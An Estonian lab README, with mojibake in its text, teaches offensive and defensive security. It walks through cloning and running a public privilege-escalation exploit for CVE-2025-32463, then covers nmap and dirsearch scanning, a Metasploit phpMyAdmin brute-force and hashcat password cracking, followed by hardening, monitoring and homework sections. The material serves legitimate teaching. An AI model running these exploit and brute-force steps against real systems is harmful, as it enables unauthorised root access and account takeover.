# Praktiline tund: VÃµrguskannimine, eksploitatsioon ja kaitse
**Autor:** ocrHeiki  
**Keel:** Eesti  
**Versioon:** v1.0

---

## Sisukord
- [EesmÃ¤rk](#eesmÃ¤rk)  
- [Hoiatus ja eetika](#hoiatus-ja-eetika)  
- [Keskkonna Ã¼lesseadistus](#keskkonna-Ã¼lesseadistus)  
  - [Masinad](#masinad)  
  - [VÃµrgustruktuur (nÃ¤ide)](#vÃµrgustruktuur-nÃ¤ide)  
- [Ubuntu Server â€” samm-sammult](#ubuntu-server---samm-sammult)  
- [Kali â€” avastamine ja tÃ¶Ã¶riistad](#kali---avastamine-ja-tÃ¶Ã¶riistad)  
  - [Nmap](#nmap)  
  - [WhatWeb & dirsearch](#whatweb--dirsearch)  
  - [Metasploit (auxiliary)](#metasploit-auxiliary)  
  - [Hashcat](#hashcat)  
- [NÃ¤idiskÃ¤sud (kokkuvÃµte)](#nÃ¤idiskÃ¤sud-kokkuvÃµte)  
- [Kaitsemeetmed ja monitooring â€” lÃ¼hijuhend](#kaitsemeetmed-ja-monitooring---lÃ¼hijuhend)  
- [KodutÃ¶Ã¶ (Ã¼lesanded)](#kodutÃ¶Ã¶-Ã¼lesanded)  
- [Soovitatud failistruktuur](#soovitatud-failistruktuur)  
- [Mall: kaitse_meetmed.md (nÃ¤ide)](#mall-kaitse_meetmedmd-nÃ¤ide)  
- [Kontakt / autori mÃ¤rkus](#kontakt--autori-mÃ¤rkus)

---

## EesmÃ¤rk
See README annab praktilise ja kompaktse juhendi labikeskkonna Ã¼lesseadmise, haavatavuste otsimise ning lihtsate kaitsemeetmete dokumenteerimise jaoks. MÃµeldud Ãµppeotstarbeliseks ja testkeskkondades kasutamiseks.

---

## Hoiatus ja eetika
**Oluline:** kÃµik siin kirjas olevad meetodid tohib kasutada **ainult** oma testkeskkonnas vÃµi kirjaliku loaga vastava sÃ¼steemi omanikult. Ebaseaduslik vÃµi volitamata rÃ¼nnak on kuritegu. Kui leiad haavatavuse reaalses sÃ¼steemis â€” kasuta vastutustundliku avaldamise protsessi.

---

## Masinad ğŸ’»
- **Ubuntu Server** â€” testsiht, kuhu laeme demo-eksploidid.  
- **Kali Linux** â€” rÃ¼nde- ja avastustÃ¶Ã¶riistad (Nmap, WhatWeb, Metasploit, Hashcat).  
- **Ruuter** â€” 2 vÃµrguadapterit: INTERNET ja sisemine VLAN (testvÃµrk).  
- **app-masin (template)** â€” teenuste testimiseks.

---

## VÃµrgustruktuur (nÃ¤ide)
- VÃµrk: `192.168.1.0/24`  
- NÃ¤idissiht: `192.168.1.69` (asenda oma labivÃµrgu IP-ga)

---

## Ubuntu Server ğŸ’» â€” samm-sammult

### 1) PÃµhipaketid
```bash
sudo apt update
sudo apt install -y gcc git
```

### 2) Kasutaja loomine (ilma `sudo` Ãµigusteta)
```bash
sudo adduser kala
# parool (nÃ¤ide): ka1a
```
> MÃ¤rkus: Ã¤riliselt/reaalses keskkonnas Ã¤ra kasuta lihtsaid paroole.

### 3) Exploit'i alla laadimine
```bash
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463
ls
chmod +x exploit.sh
```

### 4) Exploit'i kÃ¤ivitamine (AINULT testkeskkonnas)
```bash
./exploit.sh
# kontroll:
id
```
Kui exploit tÃ¶Ã¶tab, vÃµib see anda `root` Ãµigused (nÃ¤ide).

### 5) Root parooli seadistamine ja sudo paigaldus
```bash
passwd root
apt update && apt install -y sudo
```

---

## Kali ğŸ’» â€” avastamine ja tÃ¶Ã¶riistad

> TÃ¶Ã¶ta ainult lubatud testkeskkonnas.

### Nmap â€” vÃµrgu- ja teenuseskann
```bash
sudo nmap -sV -O 192.168.1.0/24
```
- MÃ¤rgi Ã¼les huvipakkuvad hostid ja avatud pordid (nt `22`, `80`, `443`).

### WhatWeb â€” veebiplatvormi tuvastus
```bash
whatweb http://192.168.1.69
```

### Dirsearch â€” veebikataloogide leidmine
```bash
sudo apt install -y dirsearch
dirsearch -u http://192.168.1.69 -e php,html,txt
```

### Metasploit â€” auxiliary skÃ¤nnerid (Ãµpetlik)
```text
msfconsole
use auxiliary/scanner/http/phpmyadmin_login
options
set RHOSTS 192.168.1.69
set TARGETURI /phpmyadmin/index.php
echo root >> /tmp/user.txt
set user_file /tmp/user.txt
set pass_file /home/heiki/Documents/rockyou.txt
run
exit
```
> Hoiatus: bruteforce ja sarnased rÃ¼nnakud on invasiivsed ning vÃµivad tekitada alarme.

### Hashcat â€” paroolihashide purustamine (Ãµpetlik)
1. Salvesta hash faili (nt `hash.txt`).  
2. KÃ¤ivita:
```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
```
- Asenda `<mode>` vastavalt hash-tÃ¼Ã¼bile (nt MD5, SHA1, bcrypt â†’ erinevad `-m` vÃ¤Ã¤rtused).

---

## NÃ¤idiskÃ¤sud (kokkuvÃµte)
```bash
# Ubuntu
sudo apt update
sudo apt install -y gcc git
sudo adduser kala
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463
chmod +x exploit.sh
./exploit.sh

# Kali
sudo nmap -sV -O 192.168.1.0/24
whatweb http://192.168.1.69
dirsearch -u http://192.168.1.69
msfconsole
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Kaitsemeetmed ja monitooring â€” lÃ¼hijuhend

### 1) Eksploit (CVE) maandamine
- Hoia sÃ¼steemid ajakohasena: `apt update && apt upgrade`.  
- Kasuta `unattended-upgrades` turvavÃ¤rskenduste jaoks.  
- Piira vÃµrgupindu (firewall, VLAN-segmendid) ja vÃ¤lista avalik ligipÃ¤Ã¤s tundlikele teenustele.

### 2) Veebirakendused (WordPress / phpMyAdmin)
- VÃ¤rskenda CMS-e, teemasid ja pluginaid regulaarse auditi alusel.  
- Piira phpMyAdmin ligipÃ¤Ã¤su (IP-blokeering, VPN vÃµi sisevÃµrk).  
- Rakenda tugevaid paroole ja mitmefaktorilist autentimist (MFA).  
- Kasuta WAF-i (nt mod_security) ja regulaarselt skÃ¤nni koodi.

### 3) Paroolikaitse
- Kehtesta paroolipoliitika (min pikkus, keerukus, lockout).  
- Salvestamisel kasuta soolatud ja vastupidavaid hashe (bcrypt/argon2).  
- Piira rÃ¤simisi: fail2ban, rate-limiting, account lockouts.

### 4) Monitooring & SIEM
- Koguge logisid: `auth.log`, webserver `access/error` logid, firewall, DB logid.  
- SIEM reeglite nÃ¤ited:
  - korduvad ebaÃµnnestunud SSH loginid â†’ alarm  
  - ootamatu DB andmete eksport â†’ alarm  
  - protsesside eskalatsioon (root shell spawn) â†’ alarm

### 5) Incidendi reageerimine
- Isoleeri haavatud masin vÃµrguÃ¼henduseta (segmenteerimine).  
- SÃ¤ilita tÃµendid (kettapilt, mÃ¤lu dump) eraldi turvalises hoidlas.  
- Teosta forensika ja taastamine varukoopiast, seejÃ¤rel rakenda parandused.

---

## KodutÃ¶Ã¶ â€” Ã¼lesanded
Koosta dokument (kasuta malli `kaitse_meetmed.md`), mis kÃ¤sitleb **kuidas kaitsta kolme rÃ¼nnetÃ¼Ã¼pi**:

1. **Eksploit (CVE)** â€” kirjeldus, test, parandused.  
2. **Veebihaavatavus / bruteforce (WordPress / phpMyAdmin)** â€” riskid ja tÃµrjevÃµtted.  
3. **Paroolide murdmine** â€” kuidas vÃ¤listada ja tuvastada.

Iga rÃ¼nne peaks sisaldama:
- Kirjeldust (mis ja kuidas)  
- Testkeskkonna nÃ¤ide (kasutatud kÃ¤sud)  
- Konkreetsed kaitsemeetmed (konfiguratsiooninÃ¤ited)  
- Monitooringu ja alarmeerimise nÃ¤ited  
- Parandus- ja taastamisplaan

---

## Soovitatud failistruktuur
```
/praktiline-tund/
â”œâ”€ README.md
â”œâ”€ ubuntu/
â”‚  â”œâ”€ ubuntu_setup.md
â”‚  â””â”€ exploit_demo/          # ainult referentsiks
â”œâ”€ kali/
â”‚  â”œâ”€ nmap_report.md
â”‚  â”œâ”€ metasploit_steps.md
â”‚  â””â”€ hashcat_notes.md
â”œâ”€ docs/
â”‚  â”œâ”€ kaitse_meetmed.md
â”‚  â””â”€ logs_and_alerts.md
â””â”€ homework/
   â””â”€ kodutoo_vastus.md
```

---

## Mall: `kaitse_meetmed.md` (nÃ¤ide)
```markdown
# Kaitsemeetmed: Eksploit (CVE-XXXX-YYYY)

## 1. Kirjeldus
LÃ¼hike tehniline kokkuvÃµte rÃ¼nnaku olemusest.

## 2. Riskid
Millised teenused/pordid on mÃµjutatud.

## 3. Kaitse
- apt update && apt upgrade
- konfigureeri unattended-upgrades
- piirata teenuse ligipÃ¤Ã¤su (firewall, VLAN)
- rakendada least-privilege kontod

## 4. Monitooring
- jÃ¤lgi auth.log, syslog, webserver logs
- SIEM reegel: "Root shell spawn" -> alarm

## 5. Reaktsioon
- isolatsioon, kettapilt, uurimine, parandamine, taastamine varukoopiast
```

---

